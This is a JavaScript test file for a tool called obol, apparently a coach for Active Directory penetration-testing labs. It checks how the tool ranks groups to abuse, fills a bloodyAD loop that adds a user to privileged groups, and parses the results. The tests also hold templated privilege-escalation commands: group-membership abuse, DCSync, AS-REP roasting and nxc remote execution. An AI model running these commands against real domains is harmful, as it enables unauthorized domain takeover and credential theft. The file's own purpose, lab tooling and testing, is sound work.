/* ACL-abuse group sweep: obol must NOT hard-code which group is the winner. From a bloodyAD get-writable
 * lead it ranks the reasonable groups (try-order, not the answer) and builds a ONE-SHOT command that adds
 * to every candidate at once; whichever add the OUTPUT confirms is recorded as ad.group_joined. */
'use strict';
var fs = require('fs'), path = require('path'), vm = require('vm');
var ENGINE = path.join(__dirname, '..', '..', 'assets', 'engine');
var ctx = { console: { log: function () {}, warn: function () {} } }; ctx.globalThis = ctx; vm.createContext(ctx);
function load(f) { vm.runInContext(fs.readFileSync(f, 'utf8'), ctx, { filename: f }); }
['facts.js', 'phases.js', 'command.js'].forEach(function (f) { try { load(path.join(ENGINE, f)); } catch (e) {} });
load(path.join(ENGINE, 'parsers', 'common.js'));
['nmap', 'directory', 'creds', 'host', 'web', 'services', 'database', 'websource'].forEach(function (m) { load(path.join(ENGINE, 'parsers', m + '.js')); });
load(path.join(ENGINE, 'parsers', 'index.js'));
var OBOL = ctx.OBOL;

var fail = 0;
function ok(cond, msg) { if (!cond) { console.error('  FAIL:', msg); fail++; } else { console.log('  ok  :', msg); } }

// ---- token fill: rank candidates, don't hard-code the winner ----
// A lead whose targets were ENUMERATED with DnsAdmins before Exchange Windows Permissions. The old code
// filled {{group}} with the first-listed (DnsAdmins) — a dead end. The winner must rank ahead of it.
var lead = { targets: ['Key Admins', 'DnsAdmins', 'Exchange Windows Permissions', 'Account Operators', 'EXCH01'] };
var facts = new OBOL.facts.FactSet([OBOL.facts.makeFact({ kind: 'ad.acl_lead', scope: 'domain:corp.local', value: lead })]);
var ctxTok = OBOL.command.buildContext(facts, { params: { domain: 'corp.local', target: '10.0.0.5', user: 'svc', password: 'pw' } });
ok(String(ctxTok.group).toLowerCase() === 'exchange windows permissions', '{{group}} ranks Exchange Windows Permissions (WriteDACL→DCSync) ahead of the first-enumerated DnsAdmins');
ok(/"Exchange Windows Permissions"/.test(ctxTok.abuse_groups_quoted) && /"DnsAdmins"/.test(ctxTok.abuse_groups_quoted) && /"Account Operators"/.test(ctxTok.abuse_groups_quoted), '{{abuse_groups_quoted}} lists EVERY reasonable candidate, quoted');
ok(ctxTok.abuse_groups_quoted.indexOf('"EXCH01"') === -1, 'a computer account (EXCH01) is not offered as a group to join');
// priority order preserved in the sweep list (EWP before DnsAdmins)
ok(ctxTok.abuse_groups_quoted.indexOf('Exchange Windows Permissions') < ctxTok.abuse_groups_quoted.indexOf('DnsAdmins'), 'the sweep tries higher-value groups first');

// the sweep template actually fills into a runnable one-shot loop
var sweepTmpl = 'for g in {{abuse_groups_quoted}}; do bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p \'{{password}}\' add groupMember "$g" {{user}} 2>/dev/null && echo "[+] JOINED: $g"; done';
var sweep = OBOL.command.fillTemplate(sweepTmpl, facts, { params: { domain: 'corp.local', target: '10.0.0.5', user: 'svc', password: 'pw' } });
ok(sweep.indexOf('{{') === -1, 'the sweep command fills with no leftover tokens');
ok(/for g in "Exchange Windows Permissions"/.test(sweep), 'the sweep iterates the quoted candidate list');

// no lead yet → the sweep still forms over the usual suspects rather than an empty loop
var empty = OBOL.command.buildContext(new OBOL.facts.FactSet([]), { params: { domain: 'corp.local' } });
ok(/"Exchange Windows Permissions"/i.test(empty.abuse_groups_quoted) && /"Backup Operators"/i.test(empty.abuse_groups_quoted), 'with no lead, {{abuse_groups_quoted}} falls back to the standard high-value groups');

// ---- evidence-driven join parsing: keep the wins, ignore the denials ----
function joinedGroups(command, stdout) {
  var r = OBOL.parsers.parseActionOutput({ actionId: '', command: command, stdout: stdout, source: 'paste', scope: 'host:10.0.0.5', domain: 'corp.local' });
  return (r.facts || []).filter(function (f) { return f.kind === 'ad.group_joined'; }).map(function (f) { return String((f.value || {}).group).toLowerCase(); });
}
// single add: the group comes from the OUTPUT, not the command
ok(joinedGroups('bloodyAD -d corp.local --host 10.0.0.5 -u svc -p \'pw\' add groupMember "DnsAdmins" svc', '[+] svc added to DnsAdmins').indexOf('dnsadmins') >= 0, 'a single add records the joined group from its success line');
// the sweep: successes AND failures interleaved — keep the wins, the denials suppress nothing
var sweepOut = [
  'for g in "Domain Admins" "Exchange Windows Permissions" "DnsAdmins"; do ...',
  'add groupMember: insufficientAccessRights for Domain Admins - Access is denied',
  '[+] svc added to Exchange Windows Permissions',
  '[+] JOINED: Exchange Windows Permissions',
  'add groupMember: insufficientAccessRights for DnsAdmins - Access is denied',
].join('\n');
var jg = joinedGroups('for g in "Domain Admins" "Exchange Windows Permissions" "DnsAdmins"; do bloodyAD ... add groupMember "$g" svc; done', sweepOut);
ok(jg.indexOf('exchange windows permissions') >= 0, 'the sweep records the group that stuck (Exchange Windows Permissions)');
ok(jg.indexOf('domain admins') === -1 && jg.indexOf('dnsadmins') === -1, 'denied groups in the sweep produce NO join fact (evidence-bound)');
ok(jg.filter(function (g) { return g === 'exchange windows permissions'; }).length === 1, 'the joined group is recorded once (dedup across the two success lines)');

// a get-writable label that ALSO carries an abuse verb (paste recovery) still parses the join
ok(joinedGroups("bloodyAD ... get writable --detail  bloodyAD ... add groupMember \"DnsAdmins\" svc", '[+] svc added to DnsAdmins').indexOf('dnsadmins') >= 0, 'an abuse verb is parsed even when the widened label also contains "get writable"');

// ---- "already a member" is confirmation, not failure (a prior sweep already joined the group) ----
var alreadyOut = ['Traceback (most recent call last):', '  File ".../bloodyAD", line 6, in <module>',
  'badldap.commons.exceptions.LDAPModifyException: entryAlreadyExists for CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=corp,DC=local (Attr) - Reason:(ERROR_MEMBER_IN_ALIAS) The specified account name is already a member of the group.'].join('\n');
var am = joinedGroups('bloodyAD -d corp.local --host 10.0.0.5 -u svc -p \'pw\' add groupMember "Exchange Windows Permissions" svc', alreadyOut);
ok(am.indexOf('exchange windows permissions') >= 0, '"already a member" (entryAlreadyExists / MEMBER_IN_ALIAS) records the membership instead of failing');

// ---- commandWasRun: obol knows a suggested command is one you already ran ----
var params = { domain: 'corp.local', target: '10.0.0.5', username: 'svc', password: 'pw' };
var acts = [{ command: "bloodyAD -d corp.local --host 10.0.0.5 -u svc -p 'pw' get writable --detail" }];
ok(OBOL.command.commandWasRun("bloodyAD -d corp.local --host 10.0.0.5 -u svc -p 'pw' get writable --detail", acts, params) === true, 'a variant matching a ledger command is recognized as already run');
ok(OBOL.command.commandWasRun("bloodyAD -d corp.local --host 10.0.0.5 -u svc -p 'pw' add dcsync svc", acts, params) === false, 'a distinct command (add dcsync) is NOT marked run just because get-writable was');
// the single add you already ran is recognized even though its group came from the ledger, not the template
var acts2 = [{ command: 'bloodyAD ... add groupMember "Exchange Windows Permissions" svc' }];
ok(OBOL.command.commandWasRun('bloodyAD -d corp.local --host 10.0.0.5 -u svc -p \'pw\' add groupMember "Exchange Windows Permissions" svc', acts2, params) === true, 'the exact add you ran (Exchange Windows Permissions) is marked already run');
ok(OBOL.command.commandWasRun('bloodyAD ... add groupMember "DnsAdmins" svc', acts2, params) === false, 'an add for a DIFFERENT group is not marked run');

// REGRESSION: two commands sharing an `nxc … --users` prefix but differing AFTER the pipe (a plain tee
// vs. an awk|grep|sort HANDOFF) must NOT collapse — running the plain enum must not tag the HANDOFF run.
var lp = { target: '10.129.95.210', domain: 'htb.local' };
var ranActs = [{ command: "nxc ldap 10.129.95.210 -u '' -p '' --users | tee ~/CTF/HTB/boxes/Windows/forest/scans/ldap-users.txt" }];
ok(OBOL.command.commandWasRun("nxc ldap 10.129.95.210 -u '' -p '' --users | tee ~/CTF/HTB/boxes/Windows/forest/scans/ldap-users.txt", ranActs, lp) === true, 'the exact nxc --users enum you ran is marked run');
ok(OBOL.command.commandWasRun("nxc ldap 10.129.95.210 -u '' -p '' --users | awk '{print $5}' | grep -vE '^-Username|^\\[|^SM_' | sort -u | tee ~/CTF/HTB/boxes/Windows/forest/scans/loot/users.txt", ranActs, lp) === false, 'the awk|grep|sort HANDOFF is NOT marked run just because the nxc enum before its pipe was');
// and a genuinely different nxc action (--asreproast) is not confused with --users
ok(OBOL.command.commandWasRun("nxc ldap 10.129.95.210 -u user -p pass --asreproast out.txt", ranActs, lp) === false, 'a different nxc action (--asreproast) is not marked run from a --users run');

// An ATTACHED dump has no typed command — obol matches on the recovered `dispatch` label instead, so the
// get-writable enumeration is marked run once its 50k-line file is attached as evidence.
var attachedActs = [{ command: '', dispatch: 'bloodyad get writable' }];
// The coach matches on the TEMPLATE (values still {{tokens}}), because a filled command carries the real
// domain/user/password/target from facts+creds that params may NOT hold. With EMPTY params, the template
// still matches the recovered dispatch — the real-world attached-dump case.
ok(OBOL.command.commandWasRun("bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail | tee {{scandir}}/bloodyad-writable.txt", attachedActs, {}) === true, 'the get-writable TEMPLATE matches the recovered dispatch of an attached dump even when params lack the lab values');
ok(OBOL.command.commandWasRun("bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add dcsync {{user}}", attachedActs, {}) === false, 'the dcsync cash-in TEMPLATE is NOT marked run by a get-writable dispatch');
// Why the template and not the filled command: a filled command whose values are absent from params leaks
// them into the signature, so it would (wrongly) fail to match the clean recovered dispatch.
ok(OBOL.command.commandWasRun("bloodyAD -d htb.local --host 10.129.94.251 -u svc-alfresco -p 's3rvice' get writable --detail", attachedActs, {}) === false, 'a FILLED command leaks lab values into the signature when params are empty (documents why the coach matches on the template)');

// REGRESSION: running the credential VALIDATION (`nxc smb …`, no -x) must NOT mark the EXEC command
// (`nxc smb … -x '<cmd>'`) as already run — they differ only by the execute flag, which the signature
// must keep. This is the "selecting a cred flipped the exec command to ✓ ran" bug.
var nxcP = { target: '10.129.95.9', username: 'svc-alfresco', password: 's3rvice', domain: 'htb.local' };
// A bare `nxc smb` (tool + mode, 2 tokens) is a generic re-runnable check — NEVER confidently "already
// run", even when an nxc smb WAS run: it recurs across moves and mis-marking it as ran is what kept
// hiding commands the operator still needed. Under-marking (re-suggest) is the safe direction.
var validationRan = [{ command: "nxc smb 10.129.95.9 -u svc-alfresco -p 's3rvice'" }];
ok(OBOL.command.commandWasRun("nxc smb {{target}} -u {{user}} -p '{{password}}'", validationRan, nxcP) === false, 'a generic `nxc smb` credential-check is NOT marked run (too generic — the coach keeps offering it)');
ok(OBOL.command.commandWasRun("nxc smb {{target}} -u {{user}} -p '{{password}}' -x '{{command}}'", validationRan, nxcP) === false, 'the EXEC nxc smb is not marked run either');
// but the DISTINCTIVE nxc enum (3 tokens, --users) IS still marked when actually run
ok(OBOL.command.commandWasRun("nxc ldap {{target}} -u '' -p '' --users", [{ command: "nxc ldap 10.129.95.9 -u '' -p '' --users | tee ldap-users.txt" }], nxcP) === true, 'a distinctive nxc ldap --users you ran is still marked run');

// the win flag flows through fillCommand so the coach can render the "Pwn This Target" badge
var winAct = { commands: [{ tool: 'x', run: 'x pwn', win: true }, { tool: 'y', run: 'y go' }] };
var fa = OBOL.command.fillAll(winAct, new OBOL.facts.FactSet([]), {});
ok(fa[0].win === true && fa[1].win === false, 'fillCommand passes the win flag through (drives the Pwn This Target badge)');

// Two DIFFERENT tools sharing a `find` subcommand must never be confused — and, more strongly, a bare
// tool+`find` is only 2 tokens (generic), so neither is marked run at all: the coach keeps offering them
// rather than risk hiding one. (sccmhunter's own "found nothing → retire" path handles that case.)
var findActs = [{ command: "sccmhunter.py find -u svc-alfresco -p 's3rvice' -d htb.local -dc-ip 10.129.94.251" }];
var cp = { target: '10.129.94.251', domain: 'htb.local', username: 'svc-alfresco', password: 's3rvice' };
ok(OBOL.command.commandWasRun("certipy find -u svc-alfresco@htb.local -p 's3rvice' -dc-ip 10.129.94.251 -vulnerable", findActs, cp) === false, 'certipy find is NOT marked run from an sccmhunter find (different tool, and too generic anyway)');
ok(OBOL.command.commandWasRun("sccmhunter.py find -u svc-alfresco -p 's3rvice' -d htb.local -dc-ip 10.129.94.251", findActs, cp) === false, 'a bare tool+find (2 tokens) is not confidently marked run — the safe, under-marking direction');

console.log(fail ? ('\nACL GROUP SWEEP: ' + fail + ' FAILURES') : '\nACL GROUP SWEEP: all passed');
process.exit(fail ? 1 : 0);
